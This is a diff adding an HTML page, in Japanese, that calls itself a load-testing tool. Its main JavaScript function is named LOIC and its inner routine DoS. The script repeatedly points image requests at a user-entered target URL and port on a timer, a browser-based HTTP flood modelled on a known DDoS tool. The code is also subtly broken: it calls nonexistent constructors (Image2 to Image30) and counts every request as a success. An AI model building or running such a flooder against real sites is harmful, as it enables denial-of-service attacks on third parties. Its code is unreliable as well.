@@ -1,1 +1,339 @@
-
+<!DOCTYPE html>
+  <html>
+    <head>
+      <script>
+        function LOIC(target, port, requestsPerSecond)
+        {
+          var requested = 0;
+          var succeeded = 0;
+          var failed = 0;
+          var isFiring = false;
+          if(target.length == 0)
+          {
+            document.getElementById("errors").innerHTML = "URLを入力してください。";
+          }
+          else if(requestsPerSecond.length == 0)
+          {
+            document.getElementById("errors").innerHTML = "リクエストスピードを入力してください。";
+          }
+          else if(requestsPerSecond == "0" || requestsPerSecond == 0)
+          {
+            document.getElementById("errors").innerHTML = "リクエスト数は0に出来ません。";
+          }
+          else
+          {
+            if(port.length == 0 || port == 0 || port == "0")
+            {
+              port = 80;
+            }
+            var onFail = function()
+            {
+              failed++;
+              document.getElementById("failed").innerHTML = failed;
+            };
+            var onSuccess = function()
+            {
+              succeeded++;
+              document.getElementById("succeeded").innerHTML = succeeded;
+            };
+            var onRequest = function()
+            {
+              requested++;
+              document.getElementById("requests").innerHTML = requested;
+            };
+            var DoS = function()
+            {
+              var image = new Image();
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image2 = new Image2();
+              image2.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image2.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image3 = new Image3();
+              image3.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image3.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image4 = new Image4();
+              image4.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image4.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image5 = new Image5();
+              image5.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image5.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image6 = new Image6();
+              image6.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image6.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image7 = new Image7();
+              image7.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image7.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image8 = new Image8();
+              image8.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image8.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image9 = new Image9();
+              image9.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image9.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image10 = new Image10();
+              image10.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image10.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image11 = new Image11();
+              image11.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image11.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image12 = new Image12();
+              image12.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image12.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image13 = new Image13();
+              image13.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image13.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image14 = new Image14();
+              image14.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image14.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image15 = new Image15();
+              image15.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image15.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image16 = new Image16();
+              image16.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image16.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image17 = new Image17();
+              image17.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image17.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image18 = new Image18();
+              image18.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image18.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image19 = new Image19();
+              image19.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image19.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image20 = new Image20();
+              image20.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image20.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image21 = new Image21();
+              image21.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image21.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image22 = new Image22();
+              image22.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image22.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image23 = new Image23();
+              image23.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image23.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image24 = new Image24();
+              image24.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image24.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image25 = new Image25();
+              image25.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image25.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image26 = new Image11();
+              image26.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image26.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image27 = new Image27();
+              image27.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image27.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image28 = new Image28();
+              image28.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image28.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image29 = new Image29();
+              image29.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image29.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image30 = new Image30();
+              image30.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              image30.src1 = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+            };
+            document.getElementById("button").onclick = function()
+            {
+              if(isFiring)
+              {
+                document.getElementById("errors").innerHTML = "";
+                document.getElementById("target").value = "";
+                document.getElementById("port").value = "";
+                document.getElementById("requestsPerSecond").value = "";
+                clearInterval(fireInterval);
+                isFiring = false;
+                document.getElementById("button").innerHTML = "テスト中";
+                document.getElementById("status").innerHTML = "未使用";
+              }
+              else
+              {
+                document.getElementById("errors").innerHTML = "";
+                document.getElementById("target").value = "";
+                document.getElementById("port").value = "";
+                document.getElementById("requestsPerSecond").value = "";
+                isFiring = true;
+                document.getElementById("button").innerHTML = "テスト終了";
+                document.getElementById("status").innerHTML = "テスト中";
+                fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) |0));
+              }
+            }
+          }
+        }
+      </script>
+      <style>
+          div {
+          background-color: #000;
+          color: #0f0;
+          border: double 4px #0f0;
+          border-radius: 10px;
+          width: 200px;
+          }
+          #errors {
+              color: #f00;
+          }
+      </style>
+      <title>
+        負荷テスト 5X
+      </title>
+        <script
+  src="https://code.jquery.com/jquery-3.6.0.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <h1>負荷テストツール</h1>
+        <input type="url" name="target" id="target" placeholder="URLを入力" />
+        <br />
+        <input type="number" name="port" id="port" placeholder="ポート（任意）" />
+        <br />
+        <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="リクエストスピード（少ない方が多い）" />
+        <br />
+        <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">テスト</button>
+        <br><sup name="errors" id="errors">
+        </sup>
+        <br />
+        <div id="param">
+        リクエスト数:
+        <span name="requests" id="requests">
+          0
+        </span>
+        <br />
+        成功数:
+        <span name="succeeded" id="succeeded">
+          0
+        </span>
+        <br />
+        失敗数:
+        <span name="failed" id="failed">
+          0
+        </span>
+        <br />
+        Status:
+        <span name="status" id="status">
+          未使用
+        </span>
+        </div>
+    </body>
+  </html>
